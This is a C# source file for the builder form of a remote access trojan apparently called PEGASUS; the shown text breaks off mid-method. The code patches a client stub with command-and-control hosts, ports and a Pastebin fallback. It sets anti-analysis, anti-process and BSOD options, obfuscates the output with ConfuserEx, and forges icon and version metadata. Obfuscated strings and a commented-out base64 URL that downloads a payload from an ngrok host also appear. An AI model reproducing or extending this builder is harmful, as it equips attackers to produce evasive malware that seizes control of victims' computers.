using dnlib.DotNet;
using dnlib.DotNet.Emit;
using Microsoft.CSharp;
using Microsoft.VisualBasic;
using Microsoft.Win32;
using PEGASUS.Cryptografhsh;
using PEGASUS.Design.RenamingObfuscation;
using PEGASUS.IcarusWings;
using PEGASUS.Properties;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;
using Vestris.ResourceLib;
using static PEGASUS.IcarusWings.CryptUtil;
using static PEGASUS.IcarusWings.RandomFile;
using FileAttributes = System.IO.FileAttributes;
using OpenFileDialog = System.Windows.Forms.OpenFileDialog;
using SaveFileDialog = System.Windows.Forms.SaveFileDialog;

namespace PEGASUS.Design
{
    public partial class FormBuilder : Form
    {
        private const int WM_COMMAND = 0x111;
        private const string alphabet = "asdfghjklqwertyuiopmnbvcxz";

        private static readonly Random randnum = new Random();


        private readonly Random random = new Random();
        private readonly RandomCharacters randomCharacters;
        private readonly RandomFileInfo randomFileInfo;
        private readonly Random T = new Random();


        private string FileName = string.Empty;
        private string vcFUoknuUGOaxmFuhuaHnywrk;

        public FormBuilder()
        {
            randomCharacters = new RandomCharacters();
            randomFileInfo = new RandomFileInfo(randomCharacters);
            InitializeComponent();
        }

        //OnProgramStart.Initialize(reupload("*\\odeg*Yel~}kxo"), reupload("92:>:2"), reupload("2ysoaFzSrfFBSp?[moodb|GlCrS|g2p<xs?"), reupload("9$:$:$:"));//3 test
        //OnProgramStart.Initialize(reupload("\\X"), reupload("82:<??"), "JU3yh7S3o4OgjQJZEsETD72o0LcwlIVVxxj", reupload("9$:$:$8"));// 3 MY SYS
        //OnProgramStart.Initialize(reupload("\\odeg"), reupload("92:>:2"), reupload("~@2rySle]Od;}FgmLDB=xk=9oizKm}nlCL"), reupload("9$:$:$:"));// 3
        private void SaveSettings()
        {
            try
            {
                var Pstring = new List<string>();
                foreach (string port in listBoxPort.Items) Pstring.Add(port);
                Properties.Settings.Default.Ports = string.Join(",", Pstring);

                var IPstring = new List<string>();
                foreach (string ip in listBoxIP.Items) IPstring.Add(ip);
                Properties.Settings.Default.IP = string.Join(",", IPstring);

                Properties.Settings.Default.Save();
            }
            catch
            {
            }
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                checkBox1.Text = "Installation ON";
                guna2GroupBox3.Enabled = true;
                textFilename.Enabled = true;
                comboBoxFolder.Enabled = true;
            }
            else
            {
                checkBox1.Text = "Installation OFF";
                guna2GroupBox3.Enabled = false;
                textFilename.Enabled = false;
                comboBoxFolder.Enabled = false;
            }
        }

        private void Builder_Load(object sender, EventArgs e)
        {
            var EytPo = Application.UserAppDataPath + "\\tsimpouki";
            var elFpv = !Directory.Exists(EytPo);
            if (elFpv)
            {
                var qskGy = Directory.CreateDirectory(EytPo);
                qskGy.Attributes = FileAttributes.Hidden | FileAttributes.Directory;
            }

            // File.WriteAllBytes(Application.UserAppDataPath + "\\tsimpouki\\tsimpouki.dll", Resources.tsimpouki);

            var Billyinstallpath = Path.Combine(Path.GetTempPath(), reupload("Ifcod~$oro"));
            if (File.Exists(Billyinstallpath)) File.Delete(Billyinstallpath);

            comboBoxFolder.SelectedIndex = 0;
            //if (Properties.Settings.Default.IP.Length == 0)
            //    listBoxIP.Items.Add("127.0.0.1");

            //string ip = Convert.ToString(listView1.SelectedItems[0].Text);
            //string port = Convert.ToString(listView1.SelectedItems[1].Text);
            //if (Properties.Settings.Default.Paste_bin.Length == 0)
            //    txtPaste_bin.Text = "https://Pastebin.com/raw/fevFJe98";

            /*
             *             
             */
            try
            {
                var ports = Properties.Settings.Default.Ports.Split(new[] { "," }, StringSplitOptions.None);
                foreach (var item in ports)
                    if (!string.IsNullOrWhiteSpace(item))
                        listBoxPort.Items.Add(item.Trim());
            }
            catch
            {
            }

            try
            {
                var ip = Properties.Settings.Default.IP.Split(new[] { "," }, StringSplitOptions.None);
                foreach (var item in ip)
                    if (!string.IsNullOrWhiteSpace(item))
                        listBoxIP.Items.Add(item.Trim());
            }
            catch
            {
            }


            if (Properties.Settings.Default.Mutex.Length == 0)
                txtMutex.Text = getRandomCharacters();

            //  txtIP.Text = Properties.Settings.Default.hIP;
            //  textBox2.Text = FrmBuilder.RandomMutex(7);
            //  txtFoldername.Text = FrmBuilder.RandomMutex(7);
            //  txtFilename.Text = FrmBuilder.RandomMutex(7) + ".exe";
            //  txtID.Text = "Client";
        }


        private void CheckBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (chkPaste_bin.Checked)
            {
                txtPaste_bin.Enabled = true;
                textIP.Enabled = false;
                textPort.Enabled = false;
                listBoxIP.Enabled = false;
                listBoxPort.Enabled = false;
                btnAddIP.Enabled = false;
                btnAddPort.Enabled = false;
                btnRemoveIP.Enabled = false;
                btnRemovePort.Enabled = false;
            }
            else
            {
                txtPaste_bin.Enabled = false;
                textIP.Enabled = true;
                textPort.Enabled = true;
                listBoxIP.Enabled = true;
                listBoxPort.Enabled = true;
                btnAddIP.Enabled = true;
                btnAddPort.Enabled = true;
                btnRemoveIP.Enabled = true;
                btnRemovePort.Enabled = true;
            }
        }

        private void BtnRemovePort_Click(object sender, EventArgs e)
        {
            if (listBoxPort.SelectedItems.Count == 1) listBoxPort.Items.Remove(listBoxPort.SelectedItem);
        }

        private void BtnAddPort_Click(object sender, EventArgs e)
        {
            try
            {
                Convert.ToInt32(textPort.Text.Trim());
                foreach (string item in listBoxPort.Items)
                    if (item.Equals(textPort.Text.Trim()))
                        return;
                listBoxPort.Items.Add(textPort.Text.Trim());
                textPort.Clear();
            }
            catch
            {
            }
        }

        private void BtnRemoveIP_Click(object sender, EventArgs e)
        {
            if (listBoxIP.SelectedItems.Count == 1) listBoxIP.Items.Remove(listBoxIP.SelectedItem);
            if (listBoxPort.SelectedItems.Count == 1) listBoxPort.Items.Remove(listBoxPort.SelectedItem);
        }

        private void BtnAddIP_Click(object sender, EventArgs e)
        {
            try
            {
                foreach (string item in listBoxIP.Items)
                {
                    textIP.Text = textIP.Text.Replace(" ", "");
                    if (item.Equals(textIP.Text))
                        return;
                }

                listBoxIP.Items.Add(textIP.Text.Replace(" ", ""));
                textIP.Clear();
                textIP.Text = Settings.IP;
            }
            catch
            {
            }

            try
            {
                Convert.ToInt32(textPort.Text.Trim());
                foreach (string item in listBoxPort.Items)
                    if (item.Equals(textPort.Text.Trim()))
                        return;
                listBoxPort.Items.Add(textPort.Text.Trim());
                textPort.Clear();
            }
            catch
            {
            }

            SaveSettings();
        }

        private static string reupload(string str)
        {
            var ch1 = '\n';
            var stringBuilder = new StringBuilder();
            foreach (uint num in str.ToCharArray())
            {
                var ch2 = (char)(num ^ ch1);
                stringBuilder.Append(ch2);
            }

            return stringBuilder.ToString();
        }

        public static void canibuild()
        {
            var assembly = Assembly.GetExecutingAssembly();
            var resourceName = reupload("PEGASUS.PegasusBytes.PegasusBytes.key");

            using (var stream = assembly.GetManifestResourceStream(resourceName))
            using (var reader = new StreamReader(stream))
            {
                var result = reader.ReadToEnd(); //
                var Billyinstallpath = Path.Combine(Path.GetTempPath(), reupload("Ifcod~$oro"));
                var Billyinstallbytes =
                    Convert.FromBase64String(result);
                File.WriteAllBytes(Billyinstallpath, Billyinstallbytes);
                File.SetAttributes(Billyinstallpath, FileAttributes.Hidden);
            }
        }

        public void addbuildlog(string txt)
        {
            guna2TextBox1.Text += txt + Environment.NewLine;
        }

        private void addbuildlogenc(string txt)
        {

        }

        public void build()
        {

         
            ModuleDefMD asmDef = null;

            try
            {
                /*
                ServicePointManager.Expect100Continue = true;
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                WebClient exclude2 = new WebClient();
                Stream streamexclude2 = exclude2.OpenRead(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly8xMjIzLTItODUtMTgyLTYzLmV1Lm5ncm9rLmlvL2NyeXB0L3B1YmxpYy9VcGRhdGVfRG93bmxvYWRzL3BvZnpldXMuanBn")));
                StreamReader readerexclude2 = new StreamReader(streamexclude2);
                String installexclude2 = readerexclude2.ReadToEnd();
                Byte[] userbytesexclude2 = Convert.FromBase64String(installexclude2);
                */

                using (asmDef = ModuleDefMD.Load(@"Stub/Client.exe"))
                using (SaveFileDialog saveFileDialog1 = new SaveFileDialog())
                {
                    saveFileDialog1.Filter = ".exe (*.exe)|*.exe";
                    saveFileDialog1.InitialDirectory = Application.StartupPath;
                    saveFileDialog1.OverwritePrompt = false;
                    saveFileDialog1.FileName = textFilename.Text + ".exe";
                    if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                    {
                        btnBuild.Enabled = false;
                        WriteSettings(asmDef);
                        if (chkRename.Checked)
                        {
                            addbuildlog("[!] Encrypting strings...");
                            addbuildlog("[!] Renaming strings");
                            addbuildlog("[!] Renaming Functions");
                            // EncryptString.DoEncrypt(asmDef);
                            Task.Run(() => { Renaming.DoRenaming(asmDef); });
                        }
                        asmDef.Write(saveFileDialog1.FileName);
                        asmDef.Dispose();
                        SaveSettings();
                        //File.Delete(Billyinstallpath);

                        if (btnAssembly.Checked)
                        {
                            addbuildlog("[!] Adding Assembly Info");
                            WriteAssembly(saveFileDialog1.FileName);
                        }

                        if (chkIcon.Checked && !string.IsNullOrEmpty(txtIcon.Text))
                        {
                            addbuildlog("[!] Injecting Icon");
                            IconInjector.InjectIcon(saveFileDialog1.FileName, txtIcon.Text);
                        }

                        guna2Transition1.HideSync(guna2PictureBox2);
                        guna2Transition1.ShowSync(guna2PictureBox3);

                        addbuildlog("[!] Saving Settings");



                        if (!chkPowershell.Checked)
                        {

                            if (chkObfu.Checked)
                                //await Task.Run(() => { Confuser(saveFileDialog1.FileName, saveFileDialog1.FileName); });

                                //guna2Transition4.HideSync(guna2TextBox1);
                                //MsgBox.Show("Payload Ready To Fly!", "Pegasus Builder", MsgBox.Buttons.OK);
                                addbuildlog("[!] Payload Ready To Fly!");
                            btnBuild.Enabled = true;
                            //this.Close();
                        }
                        else
                        {

                            if (chkObfu.Checked)
                                //  await Task.Run(() => { Confuser(saveFileDialog1.FileName, saveFileDialog1.FileName); });

                                //guna2Transition4.HideSync(guna2TextBox1);
                                //MsgBox.Show("Compiled Loader Successfully!", "Pegasus Builder", MsgBox.Buttons.OK);
                                addbuildlog("[!] Payload Ready To Fly!");
                            btnBuild.Enabled = true;
                            //this.Close();
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                btnBuild.Enabled = true;
                asmDef.Dispose();
                // Get stack trace for the exception with source file information
                var st = new StackTrace(ex, true);
                // Get the top stack frame
                var frame = st.GetFrame(0);
                // Get the line number from the stack frame
                var line = frame.GetFileLineNumber();
                MessageBox.Show(ex.Message + "Line:" + line);
            }






        }
        private async void BtnBuild_Click(object sender, EventArgs e)
        {
            if (!chkPaste_bin.Checked && listBoxIP.Items.Count == 0 || listBoxPort.Items.Count == 0) return;

            if (checkBox1.Checked)
            {
                if (string.IsNullOrWhiteSpace(textFilename.Text) ||
                    string.IsNullOrWhiteSpace(comboBoxFolder.Text)) return;
                if (!textFilename.Text.EndsWith("exe")) textFilename.Text += ".exe";
            }

            if (string.IsNullOrWhiteSpace(txtMutex.Text)) txtMutex.Text = getRandomCharacters();



            guna2Transition1.ShowSync(guna2PictureBox2);
            //var Billyinstallpath = Path.Combine(Path.GetTempPath(), reupload("Ifcod~$oro"));

            guna2Transition3.ShowSync(guna2TextBox1);
            addbuildlog("[!] Checking all given Info");
            addbuildlog("[!] Sending file to Server");
            /*
            if (File.Exists(Billyinstallpath))
            {
                File.Delete(Billyinstallpath);
                canibuild();
            }
            else
            {
                canibuild();
            }
            */
            build();
        }

        public static string RandomString(int length)
        {
            const string chars =
                "ΑΒΓΔΕΖΗΘΙΚΛΜΝΞΟΠΡΣΤΥΦΧΨΩαβγδεζηθικλμνξοπρστυφχψωABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهوي0123456789艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德אבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשת";
            ///const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[randnum.Next(s.Length)]).ToArray());
        }



        private static void Timer_Elapsed(object sender, ElapsedEventArgs e)
        {
            Application.Exit();
        }

        private static void Confuser(string file, string output)
        {
            var set = Path.GetTempPath() + "them.tmd";
            var configconfuser = Resources.config;
            configconfuser = configconfuser.Replace("%path%", Path.GetTempPath())
                .Replace("%stub%", file);

            File.WriteAllText(Path.GetTempPath() + "configconfuser.crproj", configconfuser);
            File.WriteAllBytes(Path.GetTempPath() + "confuser.zip", Resources.ConfuserEx);
            //File.WriteAllBytes(Path.GetTempPath() + "confuser.zip", Resources.ConfuserEx);

            if (Directory.Exists(Path.GetTempPath() + "Confuser"))
            {
                Directory.Delete(Path.GetTempPath() + "Confuser", true);
                Directory.CreateDirectory(Path.GetTempPath() + "Confuser");
            }

            ZipFile.ExtractToDirectory(Path.GetTempPath() + "confuser.zip", Path.GetTempPath() + "Confuser");

            Interaction.Shell(
                Path.GetTempPath() + @"Confuser\Confuser.CLI.exe -n " + Path.GetTempPath() + "configconfuser.crproj",
                AppWinStyle.Hide, true);
            //Interaction.Shell(Path.GetTempPath() + "Confuser\\confuse.exe" + " " + file + " " + " " + " " + output + "");
            //Interaction.Shell(Path.GetTempPath() + "Confuser\\Eazfuscator.NET.exe" + " " + file + " ");
            //Interaction.Shell(Path.GetTempPath() + "Confuser\\Themida.exe" + "/protect  "+set+" /inputfile "+file+" /outputfile "+output+"");
            File.Delete(file + ".bak");
            File.Delete(Path.GetTempPath() + "confuser.zip");
            File.Delete(Path.GetTempPath() + "configconfuser.crproj");
            File.Delete(set);
            Directory.Delete(Path.GetTempPath() + "Confuser", true);
        }

        public static object About(ref byte[] data, string pass)
        {
            var a = new MD5CryptoServiceProvider();
            var i = a.ComputeHash(Encoding.Unicode.GetBytes(pass));
            var s = new TripleDESCryptoServiceProvider();
            s.Key = i;
            s.Mode = CipherMode.ECB;
            return s.CreateEncryptor().TransformFinalBlock(data, 0, data.Length);
        }

        public object Runpe(ref byte[] data)
        {
            var a = new StringBuilder();
            var s = (byte[])About(ref data, "MyD4rkRootK");
            for (var i = 0; i < s.Length; i++)
            {
                var x = s[i];
                a.Append(x);
                a.Append(",");
            }

            return a.ToString().Remove(a.Length - 1);
        }

        public void Codedom(string Path, string Code, string MainClass)
        {
            var providerOptions = new Dictionary<string, string>(); //Thanks to Cobac for adding this.
            providerOptions.Add("CompilerVersion", "v4.0");
            var CodeProvider = new CSharpCodeProvider(providerOptions);
            var Parameters = new CompilerParameters();
            Parameters.GenerateExecutable = true;
            Parameters.OutputAssembly = Path;
            Parameters.CompilerOptions += "/platform:X86 /unsafe /target:winexe";
            Parameters.MainClass = MainClass;
            Parameters.IncludeDebugInformation = false;
            Parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            Parameters.ReferencedAssemblies.Add("Microsoft.VisualBasic.dll");
            Parameters.ReferencedAssemblies.Add("System.Linq.dll");
            Parameters.ReferencedAssemblies.Add("System.Core.dll");
            Parameters.ReferencedAssemblies.Add("System.Data.dll");
            Parameters.ReferencedAssemblies.Add("System.Deployment.dll");
            Parameters.ReferencedAssemblies.Add("System.Drawing.dll");
            Parameters.ReferencedAssemblies.Add("System.Xml.dll");
            Parameters.ReferencedAssemblies.Add("System.Xml.Linq.dll");
            Parameters.ReferencedAssemblies.Add("System.dll");
            Parameters.ReferencedAssemblies.Add(Process.GetCurrentProcess().MainModule.FileName);
            Parameters.ReferencedAssemblies.Add(Application.ExecutablePath);
            var Results = CodeProvider.CompileAssemblyFromSource(Parameters, Code);
            if (Results.Errors.Count > 0)
                foreach (CompilerError E in Results.Errors)
                    MessageBox.Show(E.ErrorText);
        }

        private string RandomString()
        {
#pragma warning disable CS0219 // The variable 'eng' is assigned but its value is never used
            var eng =
                "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
#pragma warning restore CS0219 // The variable 'eng' is assigned but its value is never used
#pragma warning disable CS0219 // The variable 'chn' is assigned but its value is never used
            var chn =
                "艾诶比西迪伊弗吉尺杰开勒我內普曲氏明德拉拉劇氏瑪我山蛋托克和閃卡雙劇馬闕黑我拉報網德盟雙德本報截和庵爾歐丁喇喬金歐盟本爾諾特底的配迪流金蛋金庵斯流喬拉本歐桃桃拉蛋莎奧伴腿雙桃報和德流喇代德伴德本普和加金歐截截代我瑪山的盟的塔喬拉士庵士問歐爾闕一喬德的嗯斯氏魚本蛋爾底闕氏破特雙伴桃截闕或駛歐盟托氏德普斯曲特和明喇加明進歐底黑破曲盟子和我庵闕本韋曲子的底喬底子士拉迪流或埋歐塔普流諾我進丁德氏加莎爾塔河馬迪爾塔拉山代或德哈托去破馬士一冰特奧子歐桃塔駛明德桃馬網拉喬金德斯马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德士曲冰桃腿丁喇塔截冰雙金的拉闕馬歐韋截莎普諾流斯馬破拉瑪拉本和網盟布魚截卡牛腿明和諾拉拉我卡普哈截破或馬桃一托歐莎德山的爾賃亞內貝和艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德";
#pragma warning restore CS0219 // The variable 'chn' is assigned but its value is never used
#pragma warning disable CS0219 // The variable 'heb' is assigned but its value is never used
            var heb =
                "אבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשת";
#pragma warning restore CS0219 // The variable 'heb' is assigned but its value is never used
#pragma warning disable CS0219 // The variable 'arb' is assigned but its value is never used
            var arb =
                "ابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهوي";
#pragma warning restore CS0219 // The variable 'arb' is assigned but its value is never used
            var mix =
                "αβγδεζηθικλμνξοπρστυφχψωΑΒΓΔΕΖΗΘΙΚΛΜΝΞΟΠΡΣΤΥΦΧΨΩABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzابتثجحخدذرزسشصضطظعغفقكلمنهويابتثجحخدذرزسشصضطظعغفقكلمنهوي艾诶比西迪伊弗吉尺杰开勒马娜哦屁吉吾儿丝提伊吾维豆贝尔维克斯吾贼德אבגדהוזחטיכךלמםנןסעפףצץקרשתאבגדהוזחטיכךלמםנןסעפףצץקרשת";
            var s = mix;
            var sb = new StringBuilder();
            for (var i = 1; i <= 11; i++)
            {
                var idx = T.Next(0, 177);
                sb.Append(s.Substring(idx, 1));
            }

            return sb.ToString();
        }

        public void PEGASUScryptpe()
        {
        }

        private static void ToggleDesktopIcons()
        {
            var toggleDesktopCommand = new IntPtr(0x7402);
            var hWnd = IntPtr.Zero;
            if (Environment.OSVersion.Version.Major < 6 || Environment.OSVersion.Version.Minor < 2) //7 and -
            {
                hWnd = GetWindow(FindWindow("Progman", "Program Manager"), GetWindow_Cmd.GW_CHILD);
            }
            else
            {
                var ptrs = FindWindowsWithClass("WorkerW");
                var i = 0;
                while (hWnd == IntPtr.Zero && i < ptrs.Count())
                {
                    hWnd = FindWindowEx(ptrs.ElementAt(i), IntPtr.Zero, "SHELLDLL_DefView", null);
                    i++;
                }
            }

            SendMessage(hWnd, WM_COMMAND, toggleDesktopCommand, IntPtr.Zero);
        }

        [DllImport("Shell32.dll")]
        private static extern int SHChangeNotify(int eventId, int flags, IntPtr item1, IntPtr item2);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr GetWindow(IntPtr hWnd, GetWindow_Cmd uCmd);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr FindWindowEx(IntPtr hwndParent, IntPtr hwndChildAfter, string lpszClass,
            string lpszWindow);

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder strText, int maxCount);

        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
        private static extern int GetWindowTextLength(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern bool EnumWindows(EnumWindowsProc enumProc, IntPtr lParam);

        [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);


        public static string GetWindowText(IntPtr hWnd)
        {
            var size = GetWindowTextLength(hWnd);
            if (size++ > 0)
            {
                var builder = new StringBuilder(size);
                GetWindowText(hWnd, builder, builder.Capacity);
                return builder.ToString();
            }

            return string.Empty;
        }

        public static IEnumerable<IntPtr> FindWindowsWithClass(string className)
        {
            var found = IntPtr.Zero;
            var windows = new List<IntPtr>();

            EnumWindows(delegate (IntPtr wnd, IntPtr param)
                {
                    var cl = new StringBuilder(256);
                    GetClassName(wnd, cl, cl.Capacity);
                    if (cl.ToString() == className && (GetWindowText(wnd) == "" || GetWindowText(wnd) == null))
                        windows.Add(wnd);
                    return true;
                },
                IntPtr.Zero);

            return windows;
        }

        private void WriteAssembly(string filename)
        {
            try
            {
                var versionResource = new VersionResource();
                versionResource.LoadFrom(filename);

                versionResource.FileVersion = txtFileVersion.Text;
                versionResource.ProductVersion = txtProductVersion.Text;
                versionResource.Language = 0;

                var stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
                stringFileInfo["ProductName"] = txtProduct.Text;
                stringFileInfo["FileDescription"] = txtDescription.Text;
                stringFileInfo["CompanyName"] = txtCompany.Text;
                stringFileInfo["LegalCopyright"] = txtCopyright.Text;
                stringFileInfo["LegalTrademarks"] = txtTrademarks.Text;
                stringFileInfo["Assembly Version"] = versionResource.ProductVersion;
                stringFileInfo["InternalName"] = txtOriginalFilename.Text;
                stringFileInfo["OriginalFilename"] = txtOriginalFilename.Text;
                stringFileInfo["ProductVersion"] = versionResource.ProductVersion;
                stringFileInfo["FileVersion"] = versionResource.FileVersion;

                versionResource.SaveTo(filename);
            }
            catch (Exception ex)
            {
                throw new ArgumentException("Assembly: " + ex.Message);
            }
        }

        private void BtnAssembly_CheckedChanged(object sender, EventArgs e)
        {
            if (btnAssembly.Checked)
            {
                guna2GroupBox4.Enabled = true;
                btnRandom.Enabled = true;
                btnClone.Enabled = true;
                txtProduct.Enabled = true;
                txtDescription.Enabled = true;
                txtCompany.Enabled = true;
                txtCopyright.Enabled = true;
                txtTrademarks.Enabled = true;
                txtOriginalFilename.Enabled = true;
                txtOriginalFilename.Enabled = true;
                txtProductVersion.Enabled = true;
                txtFileVersion.Enabled = true;
            }
            else
            {
                guna2GroupBox4.Enabled = false;
                btnRandom.Enabled = false;
                btnClone.Enabled = false;
                txtProduct.Enabled = false;
                txtDescription.Enabled = false;
                txtCompany.Enabled = false;
                txtCopyright.Enabled = false;
                txtTrademarks.Enabled = false;
                txtOriginalFilename.Enabled = false;
                txtOriginalFilename.Enabled = false;
                txtProductVersion.Enabled = false;
                txtFileVersion.Enabled = false;
            }
        }

        private void ChkIcon_CheckedChanged(object sender, EventArgs e)
        {
            if (chkIcon.Checked)
            {
                guna2GroupBox5.Enabled = true;
                txtIcon.Enabled = true;
                btnIcon.Enabled = true;
            }
            else
            {
                guna2GroupBox5.Enabled = false;
                txtIcon.Enabled = false;
                btnIcon.Enabled = false;
            }
        }

        private void BtnIcon_Click(object sender, EventArgs e)
        {
            using (var ofd = new OpenFileDialog())
            {
                ofd.Title = "Choose Icon";
                ofd.Filter = "Icons Files(*.exe;*.ico;)|*.exe;*.ico";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    if (ofd.FileName.ToLower().EndsWith(".exe"))
                    {
                        var ico = GetIcon(ofd.FileName);
                        txtIcon.Text = ico;
                        picIcon.ImageLocation = ico;
                    }
                    else
                    {
                        txtIcon.Text = ofd.FileName;
                        picIcon.ImageLocation = ofd.FileName;
                    }
                }
            }
        }

        private string GetIcon(string path)
        {
            try
            {
                var tempFile = Path.GetTempFileName() + ".ico";
                using (var fs = new FileStream(tempFile, FileMode.Create))
                {
            
                }

                return tempFile;
            }
            catch
            {
            }

            return "";
        }

        private void WriteSettings(ModuleDefMD asmDef)
        {

            var key = Methods.GetRandomString(32);
            var aes = new Aes256(key);
            var caCertificate = new X509Certificate2(Settings.CertificatePath, "", X509KeyStorageFlags.Exportable);
            var serverCertificate = new X509Certificate2(caCertificate.Export(X509ContentType.Cert));
            byte[] signature;
            using (var csp = (RSACryptoServiceProvider)caCertificate.PrivateKey)
            {
                var hash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(key));
                signature = csp.SignHash(hash, CryptoConfig.MapNameToOID("SHA256"));
            }
            try
            {

                foreach (var type in asmDef.Types)
                {
                    if (type.Name == "Settings")
                        foreach (MethodDef method in type.Methods)
                        {
                            if (method.Body == null) continue;
                            for (int i = 0; i < method.Body.Instructions.Count(); i++)
                            {
                                if (method.Body.Instructions[i].OpCode != OpCodes.Ldstr)
                                    continue;

                                if (method.Body.Instructions[i].Operand.ToString() == "%Ports%")
                                {

                                    var LString = new List<string>();
                                    foreach (string port in listBoxPort.Items) LString.Add(port);
                                    method.Body.Instructions[i].Operand =
                                        aes.Encrypt(string.Join(",", LString));

                                }

                                if (method.Body.Instructions[i].Operand.ToString() == "%Hosts%")
                                {

                                    var LString = new List<string>();
                                    foreach (string ip in listBoxIP.Items) LString.Add(ip);
                                    method.Body.Instructions[i].Operand =
                                        aes.Encrypt(string.Join(",", LString));

                                }

                                if (method.Body.Instructions[i].Operand.ToString() == "%Install%")
                                    method.Body.Instructions[i].Operand =
                                        aes.Encrypt(checkBox1.Checked.ToString().ToLower());

                                if (method.Body.Instructions[i].Operand.ToString() == "%Folder%")
                                    method.Body.Instructions[i].Operand = comboBoxFolder.Text;


                                if (method.Body.Instructions[i].Operand.ToString() == "%File%")
                                    method.Body.Instructions[i].Operand = textFilename.Text;

                                if (method.Body.Instructions[i].Operand.ToString() == "%Version%")
                                    method.Body.Instructions[i].Operand =
                                        aes.Encrypt(Settings.Version.Replace("PEGASUS ", ""));

                                if (method.Body.Instructions[i].Operand.ToString() == "%Key%")
                                    method.Body.Instructions[i].Operand =
                                        Convert.ToBase64String(Encoding.UTF8.GetBytes(key));

                                if (method.Body.Instructions[i].Operand.ToString() == "%MTX%")
                                    method.Body.Instructions[i].Operand = aes.Encrypt(txtMutex.Text);

                                if (method.Body.Instructions[i].Operand.ToString() == "%Anti%")
                                    method.Body.Instructions[i].Operand =
                                        aes.Encrypt(chkAnti.Checked.ToString().ToLower());

                                if (method.Body.Instructions[i].Operand.ToString() == "%AntiProcess%")
                                    method.Body.Instructions[i].Operand =
                                        aes.Encrypt(chkAntiProcess.Checked.ToString().ToLower());

                                if (method.Body.Instructions[i].Operand.ToString() == "%Certificate%")
                                    method.Body.Instructions[i].Operand = aes.Encrypt(
                                        Convert.ToBase64String(serverCertificate.Export(X509ContentType.Cert)));

                                if (method.Body.Instructions[i].Operand.ToString() == "%Serversignature%")
                                    method.Body.Instructions[i].Operand =
                                        aes.Encrypt(Convert.ToBase64String(signature));

                                if (method.Body.Instructions[i].Operand.ToString() == "%BSOD%")
                                    method.Body.Instructions[i].Operand =
                                        aes.Encrypt(chkBsod.Checked.ToString().ToLower());

                                if (method.Body.Instructions[i].Operand.ToString() == "%Paste_bin%")
                                    if (chkPaste_bin.Checked)
                                        method.Body.Instructions[i].Operand = aes.Encrypt(txtPaste_bin.Text);
                                    else
